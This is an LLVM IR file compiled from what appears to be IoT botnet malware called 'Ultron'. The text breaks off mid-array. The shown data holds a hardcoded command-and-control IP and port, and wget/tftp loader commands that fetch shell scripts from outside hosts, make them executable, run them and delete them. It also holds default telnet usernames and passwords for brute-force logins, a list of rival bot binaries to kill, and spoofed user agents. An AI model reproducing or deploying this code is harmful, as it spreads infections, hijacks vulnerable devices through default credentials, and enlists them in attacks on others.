; ModuleID = 'host/ir_sub/Ultron.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@UserAgents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.2 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.3 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.5 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.6 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.8 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.9 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.10 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.11 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.12 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.14 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.16 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.17 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.18 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.19 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.21 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.22 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.23 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.24 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.26 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.27 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.28 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.37, i32 0, i32 0)], align 8
@.str.37 = private unnamed_addr constant [15 x i8] c"168.235.82.217\00", align 1
@port = global i32 443, align 4
@wgetpayload = global i8* getelementptr inbounds ([221 x i8], [221 x i8]* @.str.38, i32 0, i32 0), align 8
@.str.38 = private unnamed_addr constant [221 x i8] c"cd /var/;wget http://168.235.82.217/sh.sh;chmod 777 sh.sh;sh sh.sh;rm -rf sh.sh;tftp -g 168.235.82.217 -r ab.sh;chmod 777 ab.sh;sh ab.sh;rm -rf ab.sh;tftp 168.235.82.217 -c get ac.sh;chmod 777 ac.sh;sh ac.sh;rm -rf ac.sh\00", align 1
@tftppayload = global i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.39, i32 0, i32 0), align 8
@.str.39 = private unnamed_addr constant [111 x i8] c"cd /tmp; /bin/busybox tftp -g -l aiSHxd -r ab.sh 213.183.53.177; /bin/busybox chmod 777 aiSHxd; sh /tmp/aiSHxd\00", align 1
@lynxpayload = global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), align 8
@.str.40 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@Telnet_Usernames = global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.41 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"support\00\00\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"CISCO\00\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"oracle\00\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"tim\00\00", align 1
@Telnet_Passwords = global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.52 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.53 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"netgear1\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"\00CISCO\00\00", align 1
@Bot_Killer_Binarys = global [176 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x 